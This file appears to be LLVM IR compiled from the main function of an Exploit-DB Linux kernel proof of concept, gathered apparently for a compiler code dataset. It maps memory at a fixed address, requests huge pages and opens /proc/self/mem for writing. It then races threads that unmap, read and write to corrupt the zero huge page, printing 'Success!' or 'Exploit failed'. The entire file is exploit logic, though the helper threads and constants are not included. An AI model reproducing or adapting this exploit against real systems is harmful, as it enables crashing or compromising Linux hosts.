; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_43199.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_43199.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.thread_args = type { i8*, i8*, i64, i64, i32, i32, i64 }

@MAP_BASE = common dso_local global i8* null, align 8
@MAP_SIZE = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [11 x i8] c"[!] mmap()\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [65 x i8] c"[!] Didn't get desired base address for the vulnerable mapping.\0A\00", align 1
@.str.2 = private unnamed_addr constant [46 x i8] c"[*] The beginning of the zero huge page: %lx\0A\00", align 1
@.str.3 = private unnamed_addr constant [60 x i8] c"[!] Didn't get desired base address for the check mapping.\0A\00", align 1
@MADV_HUGEPAGE = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [14 x i8] c"[!] madvise()\00", align 1
@PAGE_SIZE = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [13 x i8] c"[!] malloc()\00", align 1
@MEMESET_VAL = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [15 x i8] c"/proc/self/mem\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [11 x i8] c"[!] open()\00", align 1
@.str.8 = private unnamed_addr constant [35 x i8] c"[*] Racing. Gonna take a while...\0A\00", align 1
@wait_for_success = common dso_local global i64 0, align 8
@unmap_and_read_thread = common dso_local global i64 0, align 8
@write_thread = common dso_local global i64 0, align 8
@.str.9 = private unnamed_addr constant [21 x i8] c"[!] pthread_create()\00", align 1
@.str.10 = private unnamed_addr constant [22 x i8] c"[*] Done 0x%lx bytes\0A\00", align 1
@.str.11 = private unnamed_addr constant [14 x i8] c"[*] Success!\0A\00", align 1
@.str.12 = private unnamed_addr constant [21 x i8] c"[!] Exploit failed.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.thread_args, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [3 x i32], align 4
  store i32 0, i32* %1, align 4
  %6 = load i8*, i8** @MAP_BASE, align 8
  %7 = load i32, i32* @MAP_SIZE, align 4
  %8 = load i32, i32* @PROT_READ, align 4
  %9 = load i32, i32* @MAP_PRIVATE, align 4
  %10 = load i32, i32* @MAP_ANONYMOUS, align 4
  %11 = or i32 %9, %10
  %12 = call i8* @mmap(i8* %6, i32 %7, i32 %8, i32 %11, i32 -1, i32 0)
  %13 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 0
  store i8* %12, i8** %13, align 8
  %14 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 0
  %15 = load i8*, i8** %14, align 8
  %16 = load i8*, i8** @MAP_FAILED, align 8
  %17 = icmp eq i8* %15, %16
  br i1 %17, label %18, label %20

18:                                               ; preds = %0
  %19 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %192

20:                                               ; preds = %0
  %21 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 0
  %22 = load i8*, i8** %21, align 8
  %23 = load i8*, i8** @MAP_BASE, align 8
  %24 = icmp ne i8* %22, %23
  br i1 %24, label %25, label %28

25:                                               ; preds = %20
  %26 = load i32, i32* @stderr, align 4
  %27 = call i32 @fprintf(i32 %26, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.1, i64 0, i64 0))
  br label %180

28:                                               ; preds = %20
  %29 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 0
  %30 = load i8*, i8** %29, align 8
  %31 = bitcast i8* %30 to i64*
  %32 = load i64, i64* %31, align 8
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.2, i64 0, i64 0), i64 %32)
  %34 = load i8*, i8** @MAP_BASE, align 8
  %35 = load i32, i32* @MAP_SIZE, align 4
  %36 = mul nsw i32 %35, 2
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %34, i64 %37
  store i8* %38, i8** %3, align 8
  %39 = load i8*, i8** %3, align 8
  %40 = load i32, i32* @MAP_SIZE, align 4
  %41 = load i32, i32* @PROT_READ, align 4
  %42 = load i32, i32* @MAP_PRIVATE, align 4
  %43 = load i32, i32* @MAP_ANONYMOUS, align 4
  %44 = or i32 %42, %43
  %45 = call i8* @mmap(i8* %39, i32 %40, i32 %41, i32 %44, i32 -1, i32 0)
  %46 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 1
  store i8* %45, i8** %46, align 8
  %47 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 1
  %48 = load i8*, i8** %47, align 8
  %49 = load i8*, i8** @MAP_FAILED, align 8
  %50 = icmp eq i8* %48, %49
  br i1 %50, label %51, label %53

51:                                               ; preds = %28
  %52 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0))
  br label %180

53:                                               ; preds = %28
  %54 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 1
  %55 = load i8*, i8** %54, align 8
  %56 = load i8*, i8** %3, align 8
  %57 = icmp ne i8* %55, %56
  br i1 %57, label %58, label %61

58:                                               ; preds = %53
  %59 = load i32, i32* @stderr, align 4
  %60 = call i32 @fprintf(i32 %59, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.3, i64 0, i64 0))
  br label %175

61:                                               ; preds = %53
  %62 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* @MAP_SIZE, align 4
  %65 = load i32, i32* @MADV_HUGEPAGE, align 4
  %66 = call i32 @madvise(i8* %63, i32 %64, i32 %65)
  store i32 %66, i32* %4, align 4
  %67 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 1
  %68 = load i8*, i8** %67, align 8
  %69 = load i32, i32* @MAP_SIZE, align 4
  %70 = load i32, i32* @MADV_HUGEPAGE, align 4
  %71 = call i32 @madvise(i8* %68, i32 %69, i32 %70)
  %72 = load i32, i32* %4, align 4
  %73 = or i32 %72, %71
  store i32 %73, i32* %4, align 4
  %74 = load i32, i32* %4, align 4
  %75 = icmp ne i32 %74, 0
  br i1 %75, label %76, label %78

76:                                               ; preds = %61
  %77 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0))
  br label %175

78:                                               ; preds = %61
  %79 = load i64, i64* @PAGE_SIZE, align 8
  %80 = call i32 @malloc(i64 %79)
  %81 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 5
  store i32 %80, i32* %81, align 4
  %82 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 5
  %83 = load i32, i32* %82, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %87, label %85

85:                                               ; preds = %78
  %86 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0))
  br label %175

87:                                               ; preds = %78
  %88 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 5
  %89 = load i32, i32* %88, align 4
  %90 = load i32, i32* @MEMESET_VAL, align 4
  %91 = load i64, i64* @PAGE_SIZE, align 8
  %92 = call i32 @memset(i32 %89, i32 %90, i64 %91)
  %93 = load i32, i32* @O_RDWR, align 4
  %94 = call i8* @open(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.6, i64 0, i64 0), i32 %93)
  %95 = ptrtoint i8* %94 to i64
  %96 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 2
  store i64 %95, i64* %96, align 8
  %97 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 2
  %98 = load i64, i64* %97, align 8
  %99 = icmp slt i64 %98, 0
  br i1 %99, label %100, label %102

100:                                              ; preds = %87
  %101 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i64 0, i64 0))
  br label %171

102:                                              ; preds = %87
  %103 = load i32, i32* @O_RDWR, align 4
  %104 = call i8* @open(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.6, i64 0, i64 0), i32 %103)
  %105 = ptrtoint i8* %104 to i64
  %106 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 3
  store i64 %105, i64* %106, align 8
  %107 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 3
  %108 = load i64, i64* %107, align 8
  %109 = icmp slt i64 %108, 0
  br i1 %109, label %110, label %112

110:                                              ; preds = %102
  %111 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i64 0, i64 0))
  br label %167

112:                                              ; preds = %102
  %113 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.8, i64 0, i64 0))
  %114 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 4
  store i32 0, i32* %114, align 8
  br label %115

115:                                              ; preds = %142, %112
  %116 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 4
  %117 = load i32, i32* %116, align 8
  %118 = load i32, i32* @MAP_SIZE, align 4
  %119 = icmp slt i32 %117, %118
  br i1 %119, label %120, label %161

120:                                              ; preds = %115
  %121 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 6
  store i64 0, i64* %121, align 8
  %122 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 0
  %123 = load i64, i64* @wait_for_success, align 8
  %124 = trunc i64 %123 to i32
  %125 = call i32 @pthread_create(i32* %122, i32* null, i32 %124, %struct.thread_args* %2)
  store i32 %125, i32* %4, align 4
  %126 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 1
  %127 = load i64, i64* @unmap_and_read_thread, align 8
  %128 = trunc i64 %127 to i32
  %129 = call i32 @pthread_create(i32* %126, i32* null, i32 %128, %struct.thread_args* %2)
  %130 = load i32, i32* %4, align 4
  %131 = or i32 %130, %129
  store i32 %131, i32* %4, align 4
  %132 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 2
  %133 = load i64, i64* @write_thread, align 8
  %134 = trunc i64 %133 to i32
  %135 = call i32 @pthread_create(i32* %132, i32* null, i32 %134, %struct.thread_args* %2)
  %136 = load i32, i32* %4, align 4
  %137 = or i32 %136, %135
  store i32 %137, i32* %4, align 4
  %138 = load i32, i32* %4, align 4
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %140, label %142

140:                                              ; preds = %120
  %141 = call i32 @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.9, i64 0, i64 0))
  br label %163

142:                                              ; preds = %120
  %143 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 0
  %144 = load i32, i32* %143, align 4
  %145 = call i32 @pthread_join(i32 %144, i32* null)
  %146 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 1
  %147 = load i32, i32* %146, align 4
  %148 = call i32 @pthread_join(i32 %147, i32* null)
  %149 = getelementptr inbounds [3 x i32], [3 x i32]* %5, i64 0, i64 2
  %150 = load i32, i32* %149, align 4
  %151 = call i32 @pthread_join(i32 %150, i32* null)
  %152 = load i64, i64* @PAGE_SIZE, align 8
  %153 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 4
  %154 = load i32, i32* %153, align 8
  %155 = sext i32 %154 to i64
  %156 = add nsw i64 %155, %152
  %157 = trunc i64 %156 to i32
  store i32 %157, i32* %153, align 8
  %158 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 4
  %159 = load i32, i32* %158, align 8
  %160 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i64 0, i64 0), i32 %159)
  br label %115

161:                                              ; preds = %115
  %162 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.11, i64 0, i64 0))
  br label %163

163:                                              ; preds = %161, %140
  %164 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 3
  %165 = load i64, i64* %164, align 8
  %166 = call i32 @close(i64 %165)
  br label %167

167:                                              ; preds = %163, %110
  %168 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 2
  %169 = load i64, i64* %168, align 8
  %170 = call i32 @close(i64 %169)
  br label %171

171:                                              ; preds = %167, %100
  %172 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 5
  %173 = load i32, i32* %172, align 4
  %174 = call i32 @free(i32 %173)
  br label %175

175:                                              ; preds = %171, %85, %76, %58
  %176 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 1
  %177 = load i8*, i8** %176, align 8
  %178 = load i32, i32* @MAP_SIZE, align 4
  %179 = call i32 @munmap(i8* %177, i32 %178)
  br label %180

180:                                              ; preds = %175, %51, %25
  %181 = getelementptr inbounds %struct.thread_args, %struct.thread_args* %2, i32 0, i32 0
  %182 = load i8*, i8** %181, align 8
  %183 = load i32, i32* @MAP_SIZE, align 4
  %184 = call i32 @munmap(i8* %182, i32 %183)
  %185 = load i32, i32* %4, align 4
  %186 = icmp ne i32 %185, 0
  br i1 %186, label %187, label %190

187:                                              ; preds = %180
  %188 = load i32, i32* @stderr, align 4
  %189 = call i32 @fprintf(i32 %188, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.12, i64 0, i64 0))
  br label %190

190:                                              ; preds = %187, %180
  %191 = load i32, i32* %4, align 4
  store i32 %191, i32* %1, align 4
  br label %192

192:                                              ; preds = %190, %18
  %193 = load i32, i32* %1, align 4
  ret i32 %193
}

declare dso_local i8* @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @madvise(i8*, i32, i32) #1

declare dso_local i32 @malloc(i64) #1

declare dso_local i32 @memset(i32, i32, i64) #1

declare dso_local i8* @open(i8*, i32) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32, %struct.thread_args*) #1

declare dso_local i32 @pthread_join(i32, i32*) #1

declare dso_local i32 @close(i64) #1

declare dso_local i32 @free(i32) #1

declare dso_local i32 @munmap(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
